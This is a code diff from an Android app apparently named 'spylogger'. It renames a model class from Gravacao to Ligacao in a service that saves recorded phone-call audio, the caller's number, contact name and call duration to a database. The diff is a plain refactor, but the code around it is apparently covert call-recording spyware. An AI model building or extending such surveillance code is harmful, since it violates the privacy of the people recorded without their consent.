@@ -13,7 +13,7 @@ import android.util.Log;
 
 import com.gmailsender.Utils;
 import com.gravatasufoca.spylogger.helpers.MediaRecorderHelper;
-import com.gravatasufoca.spylogger.model.Gravacao;
+import com.gravatasufoca.spylogger.model.Ligacao;
 import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.repositorio.RepositorioGravacao;
 import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
@@ -103,25 +103,25 @@ public class RecordService extends Service{
 						repositorioGravacao = new RepositorioGravacaoImpl(getApplicationContext());
 						repositorioTopico=new RepositorioTopicoImpl(getApplicationContext());
 
-						Gravacao gravacao=new Gravacao();
-						gravacao.setRemetente(remetente);
-						gravacao.setData(new Date());
-						gravacao.setAudio(Utils.getBytes(mediaRecorderHelper.getRecordedFile()));
-						gravacao.setNumero(phoneNumber);
-						gravacao.setNome(com.gravatasufoca.spylogger.utils.Utils.getContactDisplayNameByNumber(phoneNumber,getApplicationContext().getContentResolver()));
-						gravacao.setDuracao(mediaRecorderHelper.getDuration());
+						Ligacao ligacao=new Ligacao();
+						ligacao.setRemetente(remetente);
+						ligacao.setData(new Date());
+						ligacao.setAudio(Utils.getBytes(mediaRecorderHelper.getRecordedFile()));
+						ligacao.setNumero(phoneNumber);
+						ligacao.setNome(com.gravatasufoca.spylogger.utils.Utils.getContactDisplayNameByNumber(phoneNumber,getApplicationContext().getContentResolver()));
+						ligacao.setDuracao(mediaRecorderHelper.getDuration());
 
-						Topico topico = repositorioTopico.findByName(gravacao.getNome());
+						Topico topico = repositorioTopico.findByName(ligacao.getNome());
 						if (topico == null) {
 							topico = new Topico.TopicoBuilder()
-									.setNome(gravacao.getNome())
-									.setIdReferencia(gravacao.getNumero())
+									.setNome(ligacao.getNome())
+									.setIdReferencia(ligacao.getNumero())
 									.build();
 
 							repositorioTopico.inserir(topico);
 						}
-						gravacao.setTopico(topico);
-						repositorioGravacao.inserir(gravacao);
+						ligacao.setTopico(topico);
+						repositorioGravacao.inserir(ligacao);
 					} catch (IOException | SQLException e) {
 						e.printStackTrace();
 					}
